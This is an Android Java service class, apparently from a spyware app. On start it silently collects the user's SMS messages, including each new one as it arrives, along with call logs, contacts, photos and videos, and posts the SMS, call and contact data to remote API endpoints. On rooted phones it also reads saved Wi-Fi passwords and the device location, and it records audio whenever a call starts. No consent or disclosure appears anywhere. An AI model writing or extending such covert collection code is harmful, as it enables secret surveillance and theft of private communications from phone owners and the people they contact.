package com.fs.fs.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.amap.api.location.AMapLocation;
import com.fs.fs.api.DeviceService;
import com.fs.fs.api.LocationService;
import com.fs.fs.api.MediaRecordService;
import com.fs.fs.api.ProviderService;
import com.fs.fs.api.network.ApiConfig;
import com.fs.fs.api.network.core.BaseResponse;
import com.fs.fs.api.network.core.HttpParams;
import com.fs.fs.api.network.core.OkHttpUtils;
import com.fs.fs.api.network.core.callback.HttpCallback;
import com.fs.fs.bean.PhoneInfo;
import com.fs.fs.bean.SMSInfo;
import com.fs.fs.utils.DeviceUtils;
import com.fs.fs.utils.NetworkUtils;

import java.util.List;

import okhttp3.Headers;

/**
 * Created by wyx on 2017/1/7.
 */

public class AppService extends Service {
    // TODO: SharePreferencesUtils 保存基本设定  SharePreferencesUtils 对比原有新增等
    // TODO: Receiver 生命进程
    // TODO: 安装 更新Service
    @Override
    public void onCreate() {
        super.onCreate();
        if (NetworkUtils.isNetworkAvailable(this)) {
            DeviceService.getCameraInfo();
            if (DeviceUtils.isRoot()) {
                // Get wifi password and the locate
                DeviceService.getWifiPasswd();
                LocationService.getInstance().once(new LocationService.LocateListener() {
                    @Override
                    public void onLocateSucceed(AMapLocation aMapLocation) {

                    }

                    @Override
                    public void onLocateFail(int errorCode, String errorInfo) {

                    }
                });
            }
            ProviderService.getInstance().getVideos();
            ProviderService.getInstance().getPictures();
            ProviderService.getInstance().getSMS(new ProviderService.SMSListener() {
                @Override
                public void onGetAllSMS(List<SMSInfo> SMSInfo) {
                    OkHttpUtils.postAsync(ApiConfig.getSMSAll(), new HttpParams().addJson("sms_all", SMSInfo), new HttpCallback(BaseResponse.class) {
                        @Override
                        public void onSuccess(BaseResponse httpResponse, Headers headers) {
                        }

                        @Override
                        public void onError(String errorMsg) {
                        }
                    });
                }

                @Override
                public void onReceive(SMSInfo sms) {
                    OkHttpUtils.postAsync(ApiConfig.getSMS(), new HttpParams().addJson("sms", sms), new HttpCallback(BaseResponse.class) {
                        @Override
                        public void onSuccess(BaseResponse httpResponse, Headers headers) {
                        }

                        @Override
                        public void onError(String errorMsg) {
                        }
                    });
                }
            });
            ProviderService.getInstance().getCalls(new ProviderService.CallsListener() {
                @Override
                public void onGetAllCall(List<PhoneInfo> callInfo) {
                    OkHttpUtils.postAsync(ApiConfig.getCall(), new HttpParams().addJson("call", callInfo), new HttpCallback(BaseResponse.class) {
                        @Override
                        public void onSuccess(BaseResponse httpResponse, Headers headers) {
                        }

                        @Override
                        public void onError(String errorMsg) {
                        }
                    });
                }

                @Override
                public void onStart() {
                    MediaRecordService.sendMessage(MediaRecordService.START_AUDIO);
                }

                @Override
                public void onFinish() {
                    MediaRecordService.sendMessage(MediaRecordService.STOP_AUDIO);
                }

                @Override
                public Boolean onPhoneNumber(String number) {
                    return true;
                }
            });
            ProviderService.getInstance().getContant(new ProviderService.ContactsListener() {
                @Override
                public void onGetAllContacts(List<PhoneInfo> contactInfo) {
                    OkHttpUtils.postAsync(ApiConfig.getContact(), new HttpParams().addJson("contact", contactInfo), new HttpCallback(BaseResponse.class) {
                        @Override
                        public void onSuccess(BaseResponse httpResponse, Headers headers) {
                        }

                        @Override
                        public void onError(String errorMsg) {
                        }
                    });
                }
            });
        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        LocationService.getInstance().close();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
